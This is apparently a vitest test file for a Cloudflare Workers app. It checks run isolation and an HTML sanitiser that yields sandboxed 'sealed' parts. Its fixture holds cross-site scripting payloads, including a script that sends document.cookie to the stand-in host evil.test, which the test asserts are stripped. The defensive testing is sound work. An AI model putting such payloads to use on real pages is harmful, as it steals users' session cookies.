// What a confined run holds stays its own: each run is an isolate of its own, and what it returns reaches a person only
// in a sealed part, which runs no script and loads nothing.
//
// Each confined run of a slate is an isolate of its own (src/slates/room.ts, `confined`): the model's premise that one
// run's label covers its whole heap. Runs of one function, by one person, holding one grant, in turn and at once: none
// sees another's module state, and each reads through its own sealed stub, which the room refuses for any other run.
import { env } from 'cloudflare:workers';
import { expect, it } from 'vitest';

it('confined runs with one image, requester and label share no isolate, in turn or at once', async () => {
  const subject = env.SLATE_DURABILITY_PROBE.get(env.SLATE_DURABILITY_PROBE.idFromName('isolated'));
  const answers = (await subject.isolatedRuns({ workspace: 'isolated-runs', owner: 'isolation-owner' })).map((answer) => JSON.parse(answer));

  expect(answers).toEqual([
    { seen: ['first'], read: 'string' },
    { seen: ['second'], read: 'string' },
    { seen: ['third'], read: 'string' },
    { seen: ['fourth'], read: 'string' },
  ]);
});

it('a part is sealed: no script, handler, link, media or style survives, and the page may run nothing or load anything', async () => {
  const subject = env.SLATE_DURABILITY_PROBE.get(env.SLATE_DURABILITY_PROBE.idFromName('sealed'));

  const hostile = [
    '<p style="color:red" onclick="steal()" colspan="2">kept <b>words</b></p>',
    '<script>fetch("https://evil.test/?" + document.cookie)</script>',
    '<img src="https://evil.test/pixel" onerror="steal()"><a href="https://evil.test">a link\'s text</a>',
    '<iframe src="https://evil.test"></iframe><svg><script>steal()</script></svg><form action="https://evil.test"><input name="x"></form>',
    '<style>body{background:url(https://evil.test/bg)}</style><link rel="stylesheet" href="https://evil.test/x.css">',
  ].join('');

  const part = await subject.sealed(hostile);
  const body = part.body.slice(part.body.indexOf('<body>'));

  expect(part.csp).toContain('sandbox');
  expect(part.csp).toContain("default-src 'none'");
  // Framed by the slate's own page and by the app, and by nothing else.
  expect(part.csp).toContain("frame-ancestors 'self' https://board-token-ws.slates.test;");
  expect(part.type).toBe('text/html; charset=utf-8');
  expect(body).toContain('kept <b>words</b>');
  expect(body).toContain('a link\'s text');

  for (const gone of ['<script', 'onclick', 'onerror', 'href', 'src=', '<img', '<iframe', '<svg', '<form', '<input', 'style=', '<style', '<link', 'evil.test']) {
    expect(body).not.toContain(gone);
  }

  // What is not text is shown as text: escaped, never markup.
  expect((await subject.sealed({ html: '<script>steal()</script>' })).body).toContain('&lt;script&gt;');
});
